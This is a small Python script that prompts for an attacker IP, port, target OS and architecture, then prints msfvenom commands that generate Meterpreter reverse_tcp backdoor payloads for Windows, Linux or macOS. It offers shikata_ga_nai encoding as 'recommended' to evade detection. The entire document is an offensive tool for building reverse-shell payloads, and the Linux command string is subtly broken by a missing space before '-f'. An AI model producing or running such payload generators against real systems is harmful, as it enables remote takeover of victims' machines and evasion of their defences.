logo = '''
M       M  SSSSS FFFFF  GGGGG  EEEEE  N   N 
M M   M M S      F      G      E      NN  N 
M  M M  M SSS    FFFF   G  GGG EEEE   N N N 
M   M   M     S  F      G   G  E      N  NN 
M       M SSSSS  F      GGGGG  EEEEE  N   N 
'''
print(logo)

IP = input("Enter your IP: ")
OS = input("Enter Target OS: ")
architecture = input("Enter architecture: ")
port = input("Enter Your Port: ")
encoding_response = input("Encode module? (Recommended!) y/n: ")
format_file = input("Enter format of file: ")
output_file = input("Enter output file name: ")

if encoding_response.lower() == "y":
    encoding = "x86/shikata_ga_nai"
else:
    encoding = "" 

windows_module = f"\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST={IP} LPORT={port} -a {architecture} -e {encoding} -f {format_file} -o {output_file}"
linux_module = f"\nmsfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={IP} LPORT={port} -a {architecture} -e {encoding}-f {format_file} -o {output_file}"
osx_module = f"\nmsfvenom -p osx/x64/meterpreter/reverse_tcp LHOST={IP} LPORT={port} -a {architecture} -e {encoding} -f {format_file} -o {output_file}"

if OS.lower() == "windows":
    print(windows_module)
elif OS.lower() == "linux":
    print(linux_module)
elif OS.lower() == "osx" or OS.lower() == "mac":
    print(osx_module)
else:
    print("OS not recognized!")
